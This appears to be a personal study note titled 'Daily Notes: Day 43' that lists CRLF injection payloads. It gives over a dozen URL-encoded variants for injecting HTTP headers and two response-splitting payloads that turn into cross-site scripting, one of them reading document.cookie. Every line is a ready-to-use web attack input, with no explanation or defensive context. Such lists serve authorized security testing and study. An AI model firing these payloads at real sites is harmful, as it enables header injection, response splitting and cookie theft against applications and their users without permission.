Daily Notes : Day 43 
CRLF Complete Checklist

%0d%0aheader:header
%0aheader:header
%0dheader:header
%23%0dheader:header
%3f%0dheader:header
/%250aheader:header
/%25250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header

Response Splitting to XSS (302)

%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E

Response Splitting to XSS (301)
 
%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr